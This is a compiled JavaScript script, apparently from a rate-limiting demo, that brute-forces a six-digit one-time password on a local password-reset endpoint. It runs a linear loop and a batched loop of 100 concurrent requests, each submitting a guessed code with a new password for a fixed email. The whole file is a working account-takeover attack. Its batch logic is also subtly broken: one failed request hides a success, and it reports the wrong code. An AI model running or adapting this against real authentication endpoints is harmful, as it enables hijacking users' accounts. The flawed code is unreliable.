"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
// Brute force attack - linear
const hackServer = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 100000; i < 999999; i++) {
        try {
            console.log(i.toString());
            const res = yield axios_1.default.post("http://localhost:3000/verify-otp", {
                email: "vishal@gmail.com",
                otp: i.toString(),
                newPassword: "vishal123",
            });
            if (res.status === 200) {
                console.log(`OTP is ${i}`);
                break;
            }
        }
        catch (e) {
            continue;
        }
    }
});
// hackServer();
const hackServerBatch = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 100000; i < 1000000; i += 100) {
        let found = false;
        console.log(`Batch ${i}`);
        let requests = [];
        for (let j = 0; j < 100; j++) {
            const otp = i + j;
            const req = axios_1.default.post("http://localhost:3000/verify-otp", {
                email: "vishal@gmail.com",
                otp: otp.toString(),
                newPassword: "vishal123",
            });
            requests.push(req);
        }
        try {
            const res = yield Promise.all(requests);
            for (let r of res) {
                if (r.status === 200) {
                    console.log(`OTP is ${i}`);
                    found = true;
                }
            }
        }
        catch (e) {
            continue;
        }
        if (found) {
            break;
        }
    }
});
hackServerBatch();
// single request
const sendRequest = () => __awaiter(void 0, void 0, void 0, function* () {
    const res = yield axios_1.default.post("http://localhost:3000/verify-otp", {
        email: "vishal@gmail.com",
        otp: "190",
        newPassword: "vishal123",
    });
    console.log(res.data);
});
